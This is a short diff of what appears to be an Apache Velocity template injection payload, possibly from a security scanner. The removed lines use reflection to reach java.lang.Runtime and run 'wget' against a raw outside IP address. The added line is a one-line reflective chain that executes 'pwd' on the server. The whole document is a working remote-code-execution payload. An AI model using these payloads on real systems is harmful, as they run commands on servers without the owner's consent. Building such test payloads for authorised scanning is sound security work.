@@ -1,5 +1,2 @@
-#set($engine="e")
-#set($run=$engine.getClass().forName("java.lang.Runtime"))
-#set($runtime=$run.getRuntime())
-#set($proc=$runtime.exec("wget http:\/\/47.52.225.211"))
-$proc
+#set($e="e")
+$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getMethod('exec',$e.getClass().forName('java.lang.String')).invoke(null, 'pwd').toString()
